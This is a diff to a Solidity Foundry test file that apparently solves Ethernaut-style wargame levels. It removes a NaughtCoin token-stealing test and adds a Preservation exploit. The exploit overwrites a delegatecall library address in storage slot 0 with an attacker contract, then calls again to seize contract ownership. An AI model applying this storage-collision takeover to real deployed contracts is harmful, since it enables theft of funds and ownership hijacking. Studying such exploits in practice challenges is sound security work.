@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.6.5;
+pragma solidity 0.8.0;
 pragma experimental ABIEncoderV2;
 
 import {console2} from "forge-std/console2.sol";
@@ -14,25 +14,32 @@ import "forge-std/console.sol";
 contract AttackTest is StdCheats, Test {
     /// @dev A function invoked before each test case is run.
 
-    Attacker attacker;
-    NaughtCoin token;
     address alice = 0x80805ae3cbE23715C1f1807A03C5fb669541C2A9;
+    Preservation preservation;
+    Attacker attacker; 
 
     function setUp() public virtual {
         // Instantiate the contract-under-test.
         vm.prank(alice);
-        token = new NaughtCoin(alice);
-        attacker = new Attacker(token);
+        LibraryContract timeZone1Library = new LibraryContract();
+        LibraryContract timeZone2Library = new LibraryContract();
+        preservation = new Preservation(address(timeZone1Library), address(timeZone2Library));
+        attacker = new Attacker();
 
     }
 
     function testAttack() public {
         vm.prank(alice);
+        //set preservation storage slot 0 to uint representation of attacker address
+        preservation.setFirstTime(uint160(address(attacker)));
+
+        require(preservation.timeZone1Library() == (address(attacker)), 'failed to set storage slot 0');
         
-        //approve stealing 
-        token.approve(address(attacker), token.balanceOf(msg.sender));
-        //steal tokens 
-        attacker.stealTokens(msg.sender);
+        // now call preservation.setFirstTime again so that the code in our attacker setTime(uint) can execute and change the preservation contract owner 
+        preservation.setFirstTime(1);
+
+        require(preservation.owner() == alice, 'owner not changed');
+
     }
 
 
